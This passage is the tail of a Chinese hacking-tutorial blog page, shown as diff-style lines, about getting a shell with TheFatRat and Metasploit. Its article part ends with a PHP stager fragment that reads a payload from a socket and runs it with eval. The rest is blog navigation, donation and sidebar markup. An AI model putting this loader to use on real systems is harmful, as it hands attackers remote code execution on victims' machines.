+<p><div id="crayon-584b9b2514d88199226413-10" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span> <span class="crayon-e">switch</span> <span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s_type</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-i">case</span> <span class="crayon-s">‘stream’</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span> <span class="crayon-o">=</span> <span class="crayon-e">fread</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-11" class="crayon-line"><span class="crayon-st">break</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-12" class="crayon-line crayon-striped-line"><span class="crayon-i">case</span> <span class="crayon-s">‘socket’</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span> <span class="crayon-o">=</span> <span class="crayon-e">socket_read</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-13" class="crayon-line"><span class="crayon-st">break</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-14" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span> <span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-sy">$</span><span class="crayon-i">a</span> <span class="crayon-o">=</span> <span class="crayon-e">unpack</span><span class="crayon-sy">(</span><span class="crayon-s">“Nlen”</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-i">a</span><span class="crayon-sy">[</span><span class="crayon-s">‘len’</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">b</span> <span class="crayon-o">=</span> <span class="crayon-s">‘’</span><span class="crayon-sy">;</span> <span class="crayon-st">while</span> <span class="crayon-sy">(</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span> <span class="crayon-o">&lt;</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">switch</span> <span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s_type</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-i">case</span> <span class="crayon-s">‘stream’</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">b</span> <span class="crayon-sy">.</span><span class="crayon-o">=</span> <span class="crayon-e">fread</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-o">-</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-st">break</span><span class="crayon-sy">;</span> <span class="crayon-i">case</span> <span class="crayon-s">‘socket’</span><span class="crayon-o">:</span> <span class="crayon-sy">$</span><span class="crayon-i">b</span> <span class="crayon-sy">.</span><span class="crayon-o">=</span> <span class="crayon-e">socket_read</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">len</span><span class="crayon-o">-</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-st">break</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-sy">}</span> <span class="crayon-sy">$</span><span class="crayon-i">GLOBALS</span><span class="crayon-sy">[</span><span class="crayon-s">‘msgsock’</span><span class="crayon-sy">]</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">GLOBALS</span><span class="crayon-sy">[</span><span class="crayon-s">‘msgsock_type’</span><span class="crayon-sy">]</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-i">s_type</span><span class="crayon-sy">;</span> <span class="crayon-e">eval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">b</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><br><br><br><br><br><br><br>&nbsp;</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag">#Metasploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/国外优秀hacking教程吐血推荐.html" rel="prev">国外优秀hacking教程吐血推荐！!</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Windows渗透利器之Pentest BOX使用详解二.html" rel="next">Windows渗透利器之Pentest BOX使用详解（二）</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频).html" data-title="利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频)" data-url="www.ggsec.cn/利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频).html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">156</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://bestsec.net" target="_blank">Bang'Blog</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=377915817&auto=0&height=430"></iframe>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载安装指南"><span class="nav-number">1.</span> <span class="nav-text">下载安装指南</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#一言不合的请猛击一下下列视频"><span class="nav-number"></span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-模拟实验环境："><span class="nav-number">1.</span> <span class="nav-text">1.模拟实验环境：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-操作步骤指南"><span class="nav-number">2.</span> <span class="nav-text">2.操作步骤指南</span></a></li></ol></li></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2019
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
